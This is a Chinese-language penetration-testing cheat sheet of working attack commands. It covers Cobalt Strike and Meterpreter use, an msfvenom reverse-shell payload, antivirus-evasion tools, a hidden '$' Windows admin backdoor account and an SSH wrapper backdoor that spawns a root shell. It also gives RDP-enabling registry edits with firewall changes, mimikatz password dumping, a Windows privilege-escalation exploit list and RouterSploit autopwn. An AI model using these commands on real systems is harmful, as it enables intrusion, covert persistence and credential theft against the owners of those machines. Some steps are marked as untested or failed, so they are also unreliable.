# Power-PenTest🕶
`渗透测试就是一个不断的进行信息收集的过程`
[TOC]

---

# 0教程资源
## 瑞士军刀/安全工具/框架
### cobaltstrike
服务端
`./teamserver 你的IP 你的密码`
客户端
`java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`
或
`javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

### metasploit
#### meterpreter tips
- 获取目标主机的cmd shell
shell命令可以进入目标主机的cmd
`命令：shell`

- 获取admin权限
getsystem命令可以提权到本地系统权限
`命令：getsystem`

- 获取系统信息
sysinfo命令会显示系统名，操作系统，架构和语言等。
`命令：sysinfo`

- 上传文件到Windows主机
简单来说，你可以上传本机的任意文件到远程目标主机中。
`命令：upload <file> <destination>`
注意：使用-r参数可以递归上传上传目录和文件

- 从windows主机下载文件
download命令可以下载远程主机上的文件
`命令：download <file> <path to save>`
注意：Windows路径要使用双斜线
如果我们需要递归下载整个目录包括子目录和文件，我们可以使用download -r命令

- 在目标主机上执行exe文件
我们也可以使用execute命令在目标主机上执行应用程序,语法也非常简单
`命令：execute -f <path> [options]`

- 提取密码操作
`load mimikatz`
`kerberos`

---

# 2Misc
## 权限维持/反侦察
### 隐匿攻击
#### 端口转发
##### ew



### 远控
#### 免杀
##### msfvenom
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.233 LPORT=6666 -f exe > 6666.exe`

##### Veil
- **安装**
```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/setup/
sudo ./setup.sh –c
sudo ./Veil.py
```

##### HERCULES
- **安装**
```bash
确保电脑里有Go
git clone https://github.com/noosec/HERCULES.git
cd HERCULES
wget -c https://github.com/fatih/color
go get github.com/fatih/color
go run Setup.go
cp -rf /root/go/src/github.com /usr/lib/go-1.7/src/github.com
cd SOURCE/
go run HERCULES.go
```

##### ASWCrypter


##### VENOM


##### metasploit-framework
```bash
use evasion/windows/windows_defender_exe
set payload windows/x64/meterpreter/reverse_tcp
set lhost 
set lport
run
```

---

### win
#### 创建后门账号
```bash
net user PHPNET$ 1234abcd~ /add #添加用户
#Windows 的帐号名称后带着“$”符号时，不会在 net user 命令中显示出帐号信息
net localgroup administrators PHPNET$ /add #将用户添加到管理组
net user PHPNET$ /del #删除用户

query user #查看会话

logoff ID号 #踢掉
```

### linux
#### SSH wrapper后门
SSH wrapper后门，没有开放额外的端口，只要对方开了SSH服务，就能远程连接
```bash
cd /usr/sbin
mv sshd ../bin
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
/etc/init.d/sshd restart
```
抱歉，实际测试未成功

---

## 信息收集
### 网络
- **TTL来判断目的主机的操作系统类型**
下面是默认操作系统的TTL：
```bash
1、WINDOWS NT/2000   TTL：128
2、WINDOWS 95/98     TTL：32
3、UNIX              TTL：255
4、LINUX             TTL：64
5、WIN7              TTL：64
```

- **修改本机电脑上面的默认TTL值**
通过修改本机上的TTL值可以混淆攻击者的判断（当然，很少有用户会这么做）。TTL 值在注册表的位置是：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters `其中有个 DefaultTTL 的 DWORD 值，其数据就是默认的 TTL 值了，我们可以修改 DefaultTTL 里面的 TTL 默认值，但不能大于十进制的 255。

### 网站
#### CDN/查源IP
- **Nslookup法**
`nslookup + 域名`

- **多地ping域名法**
利用在线网站服务多地 ping 测试

- **“常识”判断法**
在反查网站 ip 时，如果此网站有 1000 多个不同域名，那么这个 ip 多半不是真实 ip。
如果一个 asp 或者 asp.net 网站返回的头字段的 server 不是 IIS、而是 Nginx，那么多半是用了 nginx 反向代理，而不是真实 ip。
如果 ip 定位是在常见 cdn 服务商的服务器上，那么是真实 ip 的可能性就微乎其微了。

- **子域名查找法**
利用一些在线查询的网站
https://x.threatbook.cn/
https://dnsdb.io/zh-cn/ 只需输入 baidu.com type:A 就能收集百度的子域名和 ip
Google 搜索 Google site:baidu.com -www 就能查看除 www 外的子域名

- **使用子域名扫描器**
例如子域名挖掘机和 subdomainbrute(https://github.com/lijiejie/subDomainsBrute)

总结：收集子域名后尝试以解析 ip 不在 CDN 上的 ip 解析主站，真实 ip 成功被获取到。

### 主机
#### 端口扫
`nmap -T5 -A -v 1.1.1.1`

#### windows
```bash
systeminfo
```

##### 域
- 域用户列表
    a.分析特权用户组
    b.定位指定用户

- AD信息收集
    a.GPO
    b.特权令牌
    c.信任关系
    d.定位指定机器

---

# 6内/外网
## WAN
### dns
#### CVE-1999-0532  dns域传送漏洞
```bash
dig @dns.xxx.edu.cn axfr xxx.edu.cn
@指定域名服务器；axfr 为域传送指令；xxx.edu.cn表示要查询的域名；
```

---

## windows渗透
### exp
#### 快速查找未打补丁的exp
可以最安全的减少目标机的未知错误，以免影响业务。
命令行下执行检测未打补丁的命令如下：
>systeminfo>micropoor.txt&(for %i in (KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780) do @type micropoor.txt|@find /i  "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt

注：以上需要在可写目录执行。需要临时生成 micrpoor.txt，以上补丁编号请根据环境来增
删。
一般实战中在类似 tmp目录等可写目录下执行：如`C:\tmp>`

#### 常用exp
##### RCE
- MS17-010 eternalblue
- MS15-034 Vulnerability in HTTP.sys could allow remote code execution

##### 提权
- MS14-058
- MS15-051
- MS15-097
- MS16-014
- MS16-016
- MS16-032
- MS16-135
- MS17-017
- CVE-2017-0213
- CVE-2018-8120

##### 黑屏
- MS12-020

#### exp注
```bash
MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　
(windows 7/8)
CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows
10/8.1/7/2016/2010/2008)
CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows
10/8.1/7/2016/2010/2008)
MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows
7/2008/2003/XP)
MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)
MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)
MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)
MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)
MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)
MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)
MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)
MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)
MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)
MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)
MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)
MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　
(2003/2008/7/8/2012)
MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)
MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008
R2)
MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)
MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)
MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)
MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)
MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)
MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)
MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)
MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)
MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)
MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)
MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)
MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)
MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)
MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)
MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)
MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)
MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)
MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)
MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 & SP3/2003 SP2/Vista SP1 &
SP2/2008 Gold & SP2 & R2/Win7)
MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)
MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows
7/2008R2)
MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)
MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)
MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)
MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)
MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server
2003/Vista/Server 2008)
MS08-066 　[]　　 []　　(Windows 2000/XP/Server 2003)
MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)
MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)
MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)
MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　
(/NT/2000/XP/2003)
```

---

### RDP
#### cmd开RDP,及多开3389

> REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber 

测试可以：
- 开启3389端口dos命令（开启XP&2003终端服务）
    1. 方法一：`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
    2. 方法二：`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`
- 查看3389端口是否开启
    `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启`

- 更改终端端口为2008(十六进制为：0x7d8)
    1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
    2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

- 查看3389端口是否更改
    `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber/*出来的结果是16进制`

- 取消xp&2003系统防火墙对终端服务的限制及IP连接的限制：
    `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

此时可以链接3389
然后抓取密码
```bash
D:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir //打印输出mimikatz
D:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt //输出到log.txt
```

#### 多开3389
用命令没成功，还是用工具把。

### 密码
#### mimikatz
提权
`privilege::debug`

抓取密码
`sekurlsa::logonpasswords`

### 域
#### 提权
##### IPC$
##### WMIC

---

## 业务渗透
### 数据库
#### oracle
##### CVE-2012-1675 Oracle TNS Listener Remote Poisoning
```bash
use auxiliary/admin/oracle/tnscmd   #该漏洞可以远程获取到oracle的内存信息，若是能获取到内存中的数据即为存在漏洞。
use auxiliary/admin/oracle/sid_brute  #爆破oracle的SID
```

# 7工控/物联网/物理
## 物联网
### 路由器
#### routersoloit
安装
```bash
git clone https://www.github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py
```

几个模块
```bash
use scanners/autopwn
set target
run
```

